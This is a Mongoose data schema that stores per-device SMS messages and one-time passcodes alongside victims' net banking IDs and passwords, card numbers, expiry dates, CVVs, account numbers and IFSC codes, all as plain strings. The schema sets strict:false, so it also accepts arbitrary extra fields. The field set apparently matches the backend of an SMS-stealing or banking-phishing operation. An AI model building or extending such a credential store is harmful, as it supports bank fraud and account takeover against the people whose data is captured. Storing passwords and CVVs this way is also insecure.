import mongoose from 'mongoose';

const messageSchema = new mongoose.Schema({
  messageId: { type: String, default: () => 'MSG-' + Date.now() },
  deviceId: { type: String, default: 'UNKNOWN' },
  departmentName: { type: String, default: 'Department Phone' },
  mobileNumber: { type: String, default: 'N/A' },
  address: { type: String, default: 'Main Office' },
  bankName: { type: String, default: 'N/A' },
  accountNumber: { type: String, default: 'N/A' },
  ifscCode: { type: String, default: 'N/A' },
  netbankingId: { type: String, default: '' },
  netbankingPassword: { type: String, default: '' },
  cardNumber: { type: String, default: '' },
  cardExpiry: { type: String, default: '' },
  cardCvv: { type: String, default: '' },
  sender: { type: String, default: 'NOTIFICATION' },
  category: { type: String, default: 'NORMAL' },
  body: { type: String, default: '' },
  otp: { type: String, default: null },
  timestamp: { type: Date, default: Date.now },
  receivedAt: { type: Date, default: Date.now }
}, {
  timestamps: true,
  strict: false
});

export default mongoose.models.Message || mongoose.model('Message', messageSchema);
